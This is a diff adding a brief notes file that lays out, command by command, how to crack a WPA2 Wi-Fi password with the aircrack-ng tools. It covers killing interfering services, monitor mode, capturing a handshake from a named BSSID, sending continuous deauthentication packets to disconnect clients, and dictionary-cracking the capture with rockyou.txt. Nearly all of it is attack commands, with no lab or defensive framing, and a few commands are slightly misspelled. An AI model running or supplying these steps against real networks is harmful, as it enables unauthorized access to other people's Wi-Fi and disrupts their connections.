@@ -1,0 +1,19 @@
+Disable the wpa_applicant service
+#airmon-ng check kill
+
+1. Switching to monitor Mode
+#airmon-ng start wlan0
+
+2. Getting data and showing on the screen
+#airodump-ng wlan0mon
+
+3. Dumping data into the file
+#airodump -c 1 --bssid 54:A0:50:DA:7B:98 -w OURFILE wlan0mon
+
+4. Deauthentication WiFi Packets
+#aireplay-ng -0 0 -a 54:A0:50:DA:7B:98 wlan0mon
+
+5. Cracking the WPA2 Password
+#aircrack-ng -w /usr/share/wordlists/rockyou.txt OURFILE_01.cap
+
+// DOnt forget to unzip the rockyou.txt file using the command gunzip rockyou.txt
